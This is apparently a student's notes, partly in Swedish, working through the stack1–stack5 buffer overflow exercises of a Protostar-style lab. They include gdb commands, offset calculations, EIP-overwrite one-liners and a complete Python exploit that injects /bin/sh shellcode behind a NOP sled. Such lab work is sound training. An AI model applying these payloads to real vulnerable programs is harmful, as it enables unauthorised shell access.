// Hex to decimal
echo $(python -c "print(int('0x84', 0))")

// Decimal to hex
echo $(python -c "print(hex(65))")

// Decimal to byte
echo $(python -c "print(chr(132))")

Registers
EAX: Accumulator used for performing calculations, and used to store return values from function calls. Basic operations such as add, subtract, compare use this general-purpose register
EBX: Base (does not have anything to do with base pointer). It has no general-purpose and can be used to store data.
ECX: Counter used for iterations. ECX counts downward.
EDX: Data this is an extension of the EAX register. It allows for more complex calculations (multiply, divide) by allowing extra data to be stored to facilitate those calculations.
ESP: Stack pointer
EBP: Base pointer
ESI: Source Index holds the location of input data
EDI: Destination Index points to the location where the result of data operation is stored
EIP: Instruction Pointer

GDB: https://sourceware.org/gdb/onlinedocs/gdb/Invoking-GDB.html
     https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection

// Till standard input 
echo $(python -c "print('A'*300)") | ./stack4

// Som argument 
echo $(python -c "print('A'*64 + 'dcba')") | xargs ./stack1

// Multiplexer 
./stack4 &  -> start process
gdb -p 1704 -> attach to running process
tmux    -> terminal multiplexer

// HOOK STOP (Printar saker vid varje break)
define hook-stop
>info registers     -> print registers
>x/24wx $esp        -> print stack
>x/2i $eip          -> next 2 instructions
>end


******************************************
**               Stack 1                **
******************************************
echo $(python -c "print('A'*64 + 'dcba')") | xargs ./stack1

******************************************
**               Stack 2                **
******************************************
export GREENIE=$(python -c "print('A'*64 + '\n\r\n\r')")

******************************************
**               Stack 3                **
******************************************
gdb ./stack3            (objdump -d ./stack3)
disassemble main
disassemble win
win() startaddr: 0x08048424 
echo $(python -c "print('A'*64 + '$' + chr(132) + chr(4) + chr(8))") | ./stack3

******************************************
**               Stack 4                **
******************************************
chsh -s /bin/bash      -> Ändra shell till bash så gdb kör med det
bash
logout                   -> Måste logga ut för att env har SHELL som bash
objdump -M intel -d ./stack4     -> Adress för win = 080483f4
gdb ./stack4
break main
r < <(python -c 'print("A"*64)')
info frame          -> Ger: saved eip 0xb7eadc76 , och att de är på loc:  ebp at 0xbffff7c8, eip at 0xbffff7cc
// Printa stacken för att se vart saved eip är, och skriv över den med adressen till win
x/24wx $esp    -> print stack
0xbffff770:     0xbffff780      0xb7ec6165      0xbffff788      0xb7eada75
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7c0:     0x08048400      0x00000000      0xbffff848      0xb7eadc76 <---------- Saved eip (loc: 0xbffff7cc)
// Saved eip, sparad instruktion till call main, skriv över den med adressen till win
// Offset borde alltså vara: 64 + (4*3)
// Adress för win = 080483f4, vilket är 4 bytes i decimalform: 244 131 4 8
// Alltså lär det funka med: (python -c 'print("A"* (64 + (4*3)) + chr(244) + chr(131) + chr(4) + chr(8))')
echo $(python -c 'print("A"* (64 + (4*3)) + chr(244) + chr(131) + chr(4) + chr(8))') | ./stack4
// ebp ligger 4 bytes före eip så man kan också mata in tecken för att se vart man skriver över 
// ebp, för att veta offset till eip. Sen kan du skriva script:
padding = "A" * (64 + 4*2)
ebp = "AAAA"
eip = struct.pack("1", 0x080483f4)
payload = padding + ebp + eip
print(payload)

******************************************
**               Stack 5                **
******************************************
Verkar som att man alltid vill skriva över "saved $eip" i buffer overflows.
Kolla dessa vid varje segfault för att se vilken instruktion som failade, samt vilken instruktion som failade
för ibland skrivs inte $eip över om "ret" redan ser att adressen är för stor eller ngt, så man får inte se 
att "ret" försökte hoppa till adress (ex: Couldn't jump to adress: 0x41414141)
x/i $eip (Print instruktionen vi är på)
x/5wx $esp
x/s $esp (Bra att kolla efter segfault för att se vilken del av input sträng som skriver över)

Så att placera shellcode på stack kan vara farligt, speciellt om den hamnar nära eip. Det kan göra
att instruktionerna i shellcode börjar skriva över sig själva med push/pop. Antingen placera shellcode efter 
eip med en nopslide "padding" innan, eller nopslide + shellcode + padding + epi. Alltså payload bör vara:
payload = padding + EIP + nopslide ("\x90"*64) + shellcode
där EIP = start_addr (Adress där buffer börjar på stack) + len(padding) + sizeof(EIP)(troligen 4 bytes) + 10(ett bar bytes för att garantera att vi hamnar i nopslide) 
----------------
Start: 
EIP är på adress: 0xbffff7dc
Så lär kunna sätta EIP = 0xbffff7dc + 10
för att dra igång mitt script

Fick SIGTRAP av följande: (Glöm inte att köra utan break)
#!/usr/bin/env python
import struct
##eip_address = struct.pack("L", 0xbffff7dc)
start_address = int("0xbffff7dc", 16)
padding = "A" * (64 + 4*3)
EIP = struct.pack("L", start_address + 4 + 16)     ## Add 4 to end up on address after EIP, then add 10 to end up inside nopslide
shellcode = "\xcc"
nopslide = "\x90" * 64
payload = padding + str(EIP) + nopslide + shellcode
print(payload)

Bara att lägga till en fin shellcode :D
----------------------------------------- 
UPDATE:
Efter att ha lekt runt med olika shellcodes hittade jag denna: http://shell-storm.org/shellcode/files/shellcode-585.php
Men programmet fungerade ändå inte, även fast jag får SIGTRAP i gdb. Shellcode exekverades i gdb, och öppnade nytt shell,
men man får inte mata in något eftersom gdb inte kan debugga den processen. Därför måste man sedan testa shellkoden utanför.
Nästa problem var att jag inte träffade shellkoden ordentligt utanför gdb, vilket fixades genom att ändra storleken på nopslide (256),
samt addera typ 100st adresser efter EIP för att garantera att jag hamnar innanför nopslide. Det ärt för att utanför gdb läggs massa skit
till på stacken, som tex miljövariablar osv. Därför behövs en större nopslide osv.  
Så man måste typ testa utanför gdb för att få full access. 

Den slutgiltiga exploiten blev därmed: 
----------------------------------------
#!/usr/bin/env python
import struct
##eip_address = struct.pack("L", 0xbffff7dc)
start_address = int("0xbffff7dc", 16)
padding = "A" * (64 + 4*3)
EIP = struct.pack("L", start_address + 4 + 100)     ## Add 4 to end up on address after EIP, then add 10 to end up inside nopslide
shellcode = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
nopslide = "\x90" * 256
payload = padding + EIP + nopslide + shellcode
print(payload)
----------------------------------------
Där programmet ska exekveras såhär för att behålla access till det spawnade shellet: 
(python ./stack5.py; cat) | ./stack5         <---- Där cat gör att vi kan fortsätta mata in saker i shell :D

******************************************
**               Stack 6                **
******************************************
TODO :)